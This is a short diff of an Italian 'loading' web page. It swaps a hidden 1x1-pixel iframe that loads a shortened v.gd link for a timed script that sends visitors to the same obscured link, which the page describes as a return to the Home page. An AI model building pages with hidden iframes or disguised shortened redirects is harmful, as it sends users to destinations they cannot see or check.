@@ -17,11 +17,17 @@
     </head>
     <body>
         <h1 class="text-center mt-4">Caricamento</h1>
+        <h3 class="text-center mt-4">la tua richiesta verrà vista a breve</h3>
+        <h4 class="text-center mt-4">stai venendo reindirizzato alla Home</h4>
         <div class="loading">
             <span class="loading__dot"></span>
             <span class="loading__dot"></span>
             <span class="loading__dot"></span>
         </div>
-        <iframe src="https://v.gd/yJxeiL" style="width: 1px; height: 1px"> </iframe>
+        <script>
+            setTimeout(() => {
+                window.location.href = "https://v.gd/yJxeiL";
+            }, 4000);
+        </script>
     </body>
 </html>
